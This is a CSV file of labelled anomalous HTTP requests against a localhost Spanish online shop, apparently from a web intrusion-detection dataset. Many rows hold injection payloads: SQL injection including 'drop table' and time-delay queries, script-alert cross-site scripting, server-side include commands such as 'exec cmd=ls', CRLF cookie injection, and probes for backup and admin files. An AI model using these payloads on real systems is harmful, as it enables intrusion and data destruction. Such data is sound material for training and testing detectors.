,request,label
872,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=monaco&password=roznar&nombre=kiara&apellidos=palenzuela+usa&email=badland.paudler@dise�odesoftware.do&dni=86214709z&direccion=c/+alegria,+141,+12-h&ciudad=villanueva+de+oscos&cp=24735&provincia=ciudad+real&ntc=417938005782479a&b1=registrar",1
873,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=5506&b1=pasar+por+caja,1
874,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
875,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�ricoparos%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&precio=39&cantidad=48&b1=a�adir+al+carrito,1
876,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hannula&password=f0anh5eso&nombre=josela&apellidos=urzagaste+galdon&email=cantinflas@atrioregalos.bz&dni=06064345g&direcciona=c/+batalla+de+aina+190+6?a&ciudad=sant+fost+de+campsentelles&cp=24359&provincia=salamanca&ntc=6513561251939678&b1=registrar,1
877,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=??eryn&pwd=menorqu�n&remember=on&b1=entrar,1
878,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9510&b1=confirmar/,1
879,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6840&b1=pasar+por+caja/,1
880,gethttp://localhost:8080/estore/index.html,1
881,gethttp://localhost:8080/tienda1/global/estilos.css/,1
882,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+.*?rioja&precio=100&cantidad=32&b1=a�adir+al+carrito,1
883,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=schlacht&pwd=43s8a&remember=off&b1=';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%,1
884,gethttp://localhost:8080/~,1
885,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
886,gethttp://localhost:8080/tienda1/global/titulo.jsp.old,1
887,gethttp://localhost:8080/tienda1/publico/miembros.jsp.inc,1
888,"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1','0','0','0');waitfor+delay+'0:0:15';--",1
889,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=%00,1
890,gethttp://localhost:8080/iissamples/sdk/asp/docs/colorpicker.asp,1
891,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6382and+1=1&b1=confirmar,1
892,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp/,1
893,gethttp://localhost:8080/tienda1/miembros/asf-logo-wide.gif/.old,1
894,gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/asf-logo-wide.gif/.bak,1
895,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yenmeng&pwd=ceguezuelo&remember=on&b1=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e,1
896,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombrea=vino+rioja&precio=100&cantidad=68&b1=a�adir+al+carrito,1
897,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=bob@<script>alert(paros)</script>.parosproxy.org,1
898,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=crowder&password=*huer8o&nombre=cesaria&apellidos=estruch+guixa&email=ebersole.finney@mauroman.cr&dni=83100561c&direccion=pla�a+mossen+geis,+115+4?c&ciudad=porri�o,+o&cp=18520&provincia=c�ceres|&ntc=8256741675769162&b1=registrar",1
899,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
900,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9510&b1a=confirmar,1
901,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5685&b1=pasar+por+caja/,1
902,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
903,gethttp://localhost:8080/tienda1/miembros/imagenes/6909030637832563290.jsp,1
904,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
905,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gunn&password=d88ino&nombre=nuncia&apellidos=badell+macia&email=vydra@sms24h.no&dni=09955823c&direcciona=c/+closa+de+torroja+s/n+12-b&ciudad=loiu&cp=12580&provincia=asturias&ntc=9649891877150082&b1=registrar,1
906,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
907,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=laz&password=d4s�8ab8&nombre=caledonia&apellidos=antonioli+blanc&email=rao@ajuntamentdebarcelona20.vu&dni=99892750r&direcciona=c/+puerto+de+la+luz+129,+&ciudad=valverde+del+majano&cp=34126&provincia=baleares+(illes)&ntc=4228631856170637&b1=registrar",1
908,gethttp://localhost:8080/tienda1/miembros/editar.jsp~,1
909,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n'+ib�ric-'o&precio=39&cantidad=34&b1=a�adir+al+carrito,1
910,gethttp://localhost:8080/tienda1.bak,1
911,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5716&b1=pasar+por+caja/,1
912,gethttp://localhost:8080/tienda1/imagenes/logo.gif/6909030637832563290.jsp,1
913,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=3714&b1=confirmar,1
914,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=8650&b1=confirmar,1
915,gethttp://localhost:8080/tienda1.bak,1
916,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=vino+rioja&precio=85&cantidad=31&b1=a�adir+al+carrito,1
917,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=prestipi&password=9odad7&nombre=william&apellidos=albella+sahagun&email=northrup@ajuntamentbarcelona20.mu&dni=33293484h');waitfor+delay+'0:0:15';--&direccion=bizenta+mogel+65,+&ciudad=casas+de+reina&cp=42216&provincia=madrid&ntc=8964286236058281&b1=registrar",1
918,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
919,gethttp://localhost:8080/tienda1/publico/registro.jsp.java,1
920,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito%2b,1
921,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=iolanthe&password=vortiginosa&nombre=bulmaro%3f&apellidos=castelazo+cuadros&email=aidman@silver-knights.tj&dni=83201516m&direccion=calle+dulzaina+119+1c&ciudad=curiel+de+duero&cp=45140&provincia=c�rdoba&ntc=9082133825595036&b1=registrar,1
922,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2'+delete+from+users,1
923,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8559&b1=confirmar/,1
924,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rayna&password=sa5di-3&nombre=rolando&apellidos=corzo&email=mueller@x2.com.gh&dnia=15491128f&direccion=calle+granate,+21,+&ciudad=lahiguera&cp=50316&provincia=santa+cruz+de+tenerife&ntc=2289103302521090&b1=registrar",1
925,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=norio8&password=4l7ct4ot7pi5a&nombre=jaen&apellidos=alicante+oruna&email=cumby@blogsmegumi.ly','0','0','0','0');waitfor+delay+'0:0:15';--&dni=01105274d&direccion=calle+german+monzon+gamon,+46+&ciudad=puente+la+reina+de+jaca&cp=08278&provincia=ciudad+real&ntc=3246974816793870&b1=registrar",1
926,gethttp://localhost:8080/msadc/adcvbs.inc,1
927,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=queso+manchego&precio=39&cantidad=21&b1=a�adir+al+carrito,1
928,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=2&nombre=queso+manchego&precio=100&cantidad=65&b1=a�adir+al+carrito,1
929,puthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,1
930,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+.*?rioja&precio=39&cantidad=2&b1=a�adir+al+carrito,1
931,gethttp://localhost:8080/tienda1/publico/pagar.jsp/.inc,1
932,"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=espinosa&pwd=candado&remember=off','0','0');waitfor+delay+'0:0:15';--&b1=entrar",1
933,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=auton&pwda=gubi9&remember=on&b1=entrar,1
934,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=alzofon&password=0in5fera&nombre=rosario&apellidos=_espa�a+villa+r?ejo&email=stadbauer@aadsl.de&dni=77987215b&direccion=passatge+serracant,+34+7-c&ciudad=azaila&cp=18132&provincia=almer�a&ntc=1281089993352659&b1=registrar",1
935,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wallace&password=tucurpilla&nombre=juanita&apellidos=simonetti+campam�&email=mowery@sayuela.ph&dnia=49682962h&direccion=sicilia+159+&ciudad=alcubillas&cp=08736&provincia=ja�n&ntc=3071106416830045&b1=registrar,1
936,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=savoie&pwd=uni�n&remember=off/&b1=entrar,1
937,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sundar&pwda=respetosa&remember=on&b1=entrar,1
938,puthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,1
939,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hedrich&pwd=m,ul',so&remember=off&b1=entrar",1
940,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=michaud&password=cit73e,/'o&nombre=enoch&apellidos=demuner&email=stevensen7@deltamarina.cat&dni=50873406m&direccion=emigrante+50,+&ciudad=monroyo&cp=30191&provincia=guadalajara&ntc=8474012494914092&b1=registrar",1
941,gethttp://localhost:8080/tienda1/publico/productos.jsp.old,1
942,gethttp://localhost:8080/_cti_pvt/uniqperm.cnf,1
943,"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3471&b1=""+and+""1""=""1",1
944,gethttp://localhost:8080/tienda1/asf-logo-wide.gif/,1
945,gethttp://localhost:8080/iisadmpwd/aexp2.htr,1
946,gethttp://localhost:8080/tienda1/imagenes/asf-logo-wide.gif.old,1
947,gethttp://localhost:8080/tienda1/imagenes/2.gif/,1
948,"posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito<!--#exec+cmd=""ls+/""-->",1
949,gethttp://localhost:8080/tienda1/publico/registro.jsp/asf-logo-wide.gif.inc,1
950,"gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=""+and+""1""=""1",1
951,gethttp://localhost:8080/tienda1/publico.old,1
952,gethttp://localhost:8080/asf-logo-wide.inc,1
953,"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=<!--#exec+cmd=""ls+/""-->&b1=pasar+por+caja",1
954,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=fallows&password=hidrost�t.ica&nombre=florentin&apellidos=diosdado+pi�eiro&email=jones-davis@cincocolores.cf&dni=68096192t&direccion=calle+san+sebastian+38,+&ciudad=hontecillas&cp=09292&provincia=burgos&ntc=bob@<script>alert(paros)</script>.parosproxy.org&b1=registrar",1
955,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1599&b1=pasar+por+caja/,1
956,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=marv|&pwd=meitad&remember=off&b1=entrar,1
957,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cohen&password=pirr7n108&nombre=siro&apellidos=casaramon+tetatzin&email=malcolm_motaung@enlanzarote.com.yu&dni=91b898b927n&direccion=cristo+rey,+59,+2b&ciudad=arenales+de+san+gregorio&cp=24745&provincia=huelva&ntc=2796424278292099&b1=registrar",1
958,gethttp://localhost:8080/_vti_bin/shtml.dll,1
959,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
960,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=wonuk&password=pulverizador""><!--#exec+cmd=""dir+""--><&nombre=mahoma&apellidos=alorda+goicoechea&email=fenn@ticketsport.nu&dni=08512419g&direccion=calle+amanecer+105+&ciudad=fuente+de+san+esteban,+la&cp=16611&provincia=huelva&ntc=9776865441504888&b1=registrar",1
961,gethttp://localhost:8080/tienda1/publico/carrito.jsp/.bak,1
962,gethttp://localhost:8080/tienda1/imagenes/2.gif/6909030637832563290.jsp,1
963,gethttp://localhost:8080/tienda1/publico/autenticar.jsp/6909030637832563290.jsp.old,1
964,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=legs&password=901gi5a&nombre=di�genes&apellidos=barcel�+celada&email=%2b&dni=63732924q&direccion=c/+agustin+lara,+120+2?d&ciudad=terrinches&cp=08786&provincia=burgos&ntc=6410780518660227&b1=registrar",1
965,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=<!--#include+file=""archivo_secreto""+-->&password=pirr7n108&nombre=siro&apellidos=casaramon+tetatzin&email=malcolm_motaung@enlanzarote.com.yu&dni=30635705g&direccion=cristo+rey,+59,+2b&ciudad=arenales+de+san+gregorio&cp=24745&provincia=huelva&ntc=2796424278292099&b1=registrar",1
966,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kessiah&password=es,batimento&nombre=ruth&apellidos=burch+echaniz&email=gandett@cajucar.az&dni=77572920s&direccion=pl.+eduardo+chillida,+40+&ciudad=sanxenxo&cp=17161&provincia=zamora&ntc=2803074671836038&b1=registrar",1
967,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4388&b1a=pasar+por+caja,1
968,gethttp://localhost:8080/asf-logo-wide.gif~,1
969,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
970,"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1""+and+""1""=""1",1
971,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=mathews&pwd=6u1ad5&remember=on&b1=entrar,1
972,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=danforth7&password=p�0o7i&nombre=liana&apellidosa=crivill�+van+derdys&email=vuosalmi.camp@risiberia.ph&dni=70627754k&direccion=calle+rosal,+42+4?d&ciudad=casas+de+don+antonio&cp=17780&provincia=segovia&ntc=8272734810678085&b1=registrar",1
973,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hedman&password=53t�rico&nombre=rayburn&apellidos=graupera+huaranca&email=fegan@unidadesdeventilacion.az&dni=36292641k&direccion=c/+estrella+de+venus,+23+2-a&ciudad=cendea+de+olza/oltza+zendea&cp=07127&provincia=huelva&ntc=2764848687566400&b1a=registrar",1
974,"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=<!--#exec+cmd=""ls+/""-->&pwd=+ad7quie7&remember=on&b1=entrar",1
975,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sarna5&password=!laureando&nombre=alci.a&apellidos=calera+hera&email=allenbury-nantasiri@audiosat.az&dni=02790010h&direccion=calle+castilleja+de+la+cuesta+70,+&ciudad=t�rvia&cp=03638&provincia=girona&ntc=1446048659469569&b1=registrar",1
976,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9111&b1=confirmar/,1
977,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sudabeh85&password=9364c4damente&nombre=elsio&apellidos=cantonati&email=hyke@100mbps.iq&dni=77489593v&direccion=urbanizacion+los+girasoles,+132+&ciudad=loiu&cp=37621&provincia=madrid&ntc=8137119286201470&b1=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e",1
978,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=alzofon&password=0in5fera&nombre=rosario&apellidos=narva&email=stadbauer@aadsl.de&dni=77987215b&direccion=passatge+serracant,+34+7-c%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&ciudad=azaila&cp=18132&provincia=almer�a&ntc=1281089993352659&b1=registrar",1
979,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=wing-man7&pwd=edific9r&remember=off/&b1=entrar,1
980,gethttp://localhost:8080/admin/login.do,1
981,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%&precio=5080&b1=pasar+por+caja,1
982,gethttp://localhost:8080/iissamples/sdk/asp/database/update_vbscript.asp,1
983,gethttp://localhost:8080/tienda1/publico/vaciar.jsp/6909030637832563290.jsp,1
984,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=perceval&password=0er,0lle31&nombre=parmenio&apellidos=d'molino+bocas&email=jay@almascanarias.wf&dni=96398598d&direccion=lepant+33,+&ciudad=benuza&cp=26560&provincia=guadalajara&ntc=2171179152751946&b1=registrar",1
985,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=briney&pwd=concesa&remembera=off&b1=entrar,1
986,gethttp://localhost:8080/tienda1/imagenes/6909030637832563290.jsp,1
987,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=suat&password=puerta1entana&nombre=isis&apellidos=piera+atencia&email=vinci@espaciodelpintor.ic&dni=23679741e&direccion=calle+torre+dels+socors+29,+11?e&ciudad=quiruelas+de+vidriales&cpa=34419&provincia=burgos&ntc=0825075702605085&b1=registrar",1
988,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shonuck&password=9r3h7la�8&nombre=hortencia&apellidos=ma��+moscoso&email=valadez@gaudio.bj&dni=81703579n&direccion=poligono+amargacena+141+&ciudad=hita&cp=06658&provincia=barcelona&ntc=7343251905864691&b1=','0','0');waitfor+delay+'0:0:15';--",1
989,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombrea=vino+rioja&precio=39&cantidad=5&b1=a�adir+al+carrito,1
990,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3';waitfor+delay+'0:0:15';--&nombre=jam�n+ib�rico&precio=100&cantidad=57&b1=a�adir+al+carrito,1
991,gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/asf-logo-wide,1
992,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jamilah&password=e0f2n87a&nombre=virma&apellidos=duch+vilarnau&email=rosamond_aloyshina@videospornocaseros.aq&dni=84711932b&direccion=alfredo+donay+178,+&ciudad=casas+del+monte&cp=17650&provincia=za./ragoza&ntc=7712379186246495&b1=registrar",1
993,puthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,1
994,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yurik&password=a4orrachada&nombre=rock&apellidos=morales+urgell&email=golabek@joll.cf&dni=24231534e&direccion=plegadero+alto+48,+&ciudad=alf�s+del+pi,+l'&cp=13120any%0d%0aset-cookie%3a+tamper%3d5765205567234876235&provincia=cuenca&ntc=7817403668944119&b1=registrar",1
995,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=vino+rioja&precio=85&cantidad=35&b1=a�adir+al+carrito,1
996,"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas','0');waitfor+delay+'0:0:15';--",1
997,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bao&password=val�&nombre=norberta&apellidos=poller+saravia&email=bervil@tetdevel@ocidad@.s@t&dni=12690729l&direccion=c/+valls+30,+10-f&ciudad=luciana&cp=02316&provincia=salamanca&ntc=0204088681426033&b1=registrar",1
998,gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg.inc,1
999,gethttp://localhost:8080/tienda1/imagenes.bak,1
1000,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=izique&password=48a6850ll3&nombrea=otilia&apellidos=planelles+neris&email=divoka@mercadozoom.bf&dni=36504708m&direccion=calle+bolivia,+69,+&ciudad=avil�s&cp=22468&provincia=le�n&ntc=1926544477784446&b1=registrar",1
1001,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&logina=olson&password=confesur�a&nombre=aberardo&apellidos=segovia&email=raya@acumulador.com.iq&dni=06076324t&direccion=calle+rio+pisuerga+34+&ciudad=marug�n&cp=15589&provincia=lleida&ntc=0903154438828489&b1=registrar,1
1002,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bartz&password=impunida&nombre=eliberto&apellidos=ba�os+peleij�&email=|&dni=88597573d&direccion=calle+albacete,+83+&ciudad=nevada&cp=28794&provincia=ourense&ntc=4823016932298784&b1=registrar",1
1003,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gonzaga&password=acontecimiento&nombre=redenta&apellidos=libano+parramon&email=vigran@maletti.cy&dni=24320656l&direccion=calle+tagarnina,+120,+13c&ciudad=tor..m*os&cp=10748&provincia=castell�n&ntc=6815796601581594&b1=registrar",1
1004,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito'+and+'1'='1,1
1005,gethttp://localhost:8080/tienda1/publico/pagar.jsp.old,1
1006,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2445&b1=confirmar/,1
1007,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=?&precio=794&b1=pasar+por+caja,1
1008,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=nevinbob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org&pwd=desgraduar&remember=on&b1=entrar,1
1009,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shari&pwd=agobiado&remember=on&b1a=entrar,1
1010,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=slinowsk&password=b4c2chu0&nombre=chera�&apellidos=jorda+escol�&email=dai-line@gay-tantra.ma&dni=97610819s&direccion=c/+vulcano+29+&ciudad=manzanillo&cp=5037a&provincia=�vila&ntc=4772503716652699&b1=registrar,1
1011,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=wylie&pwd=31g4050/056i'co&remember=off&b1=entrar,1
1012,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
1013,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lethia&password=o$btenible&nombre=-luigi&apellidos=feixas&email=kerylen@sindualidad.bj&dni=84692480v&direccion=travesia+echavacoiz+alto,+108,+&ciudad=farrera&cp=23110&provincia=guadalajara&ntc=6087445564133176&b1=registrar",1
1014,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=1&nombre=queso+manchego&precio=39&cantidad=86&b1=a�adir+al+carrito,1
1015,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&precio=229&b1=pasar+por+caja,1
1016,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&precio=587&b1=pasar+por+caja,1
1017,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ensign&password=qui!cialera&nombrea=edward&apellidos=castany+bigorra&email=max.shneider@oleoschamizo.ps&dni=75272191e&direccion=bonifacio+zamora+de+usabel+105,+&ciudad=t�jola&cp=44591&provincia=vizcaya&ntc=2584059042317587&b1=registrar",1
1018,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
1019,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727%0d%0a,1
1020,gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/4861362529278789730.bak,1
1021,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2?,1
1022,gethttp://localhost:8080/tienda1/imagenes/asf-logo-wide.gif/,1
1023,gethttp://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.gif.old,1
1024,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=chu-chue&password=depr67a&nombre=marley&apellidos=junqueras&email=craven.maillard@xslive.th&dni=13189812w&direccion=passatge+de+graziella+pareto,+63,+3?c&ciudad=carrizo&cpa=10130&provincia=zaragoza&ntc=7866818730779825&b1=registrar",1
1025,gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg~,1
1026,gethttp://localhost:8080/tienda1/publico/productos.jsp.inc,1
1027,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=39&cantidad=84&b1a=a�adir+al+carrito,1
1028,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasbob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
1029,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
1030,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=spight&pwd=aj1quecars0&remember=on/&b1=entrar,1
1031,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=visvanat&password=mohatrera&nombre=helga&apellidos=peratill&email=hauser@whitepearlresort.as&dni=88363371q&direccion=calle+sandoval+135,+4?b&ciudad=s�daba&cpa=40183&provincia=zaragoza&ntc=6865627677043866&b1=registrar",1
1032,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=robbie&password=7nexor40ilidad&nombre=milet&apellidos=alles+araujo&email=adix_adam@easyviaggio.com.km&dni=56876585t&direccion=calle+juan+montilla,+50+1-a&ciudad=paterna&cp=1949a&provincia=navarra&ntc=9173328900592385&b1=registrar",1
1033,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39/&cantidad=30&b1=a�adir+al+carrito,1
1034,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cirulli&password=exployada&nombre=nadini&apellidos=crusell+es.+m*arcelin&email=hell.nomura@velazquezlarra�aga.am&dni=61186493f&direccion=c/+rafael+company+""farmaceutic"",+135,+&ciudad=salas+altas&cp=01039&provincia=guadalajara&ntc=9812245040414546&b1=registrar",1
1035,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
1036,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zureik&password=concurrente&nombre=lino&apellidos=u*rgell++cerarols&email=schulz@hiperbarcelona.hn&dni=64105812m&direccion=camoe,+189,+&ciudad=olv�s&cp=03579&provincia=guip�zcoa&ntc=6282081679981232&b1=registrar",1
1037,puthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=85&cantidad=74&b1=a�adir+al+carrito,1
1038,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=buzzy&pwd=impr37e4197d9&remember=on&b1=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2,1
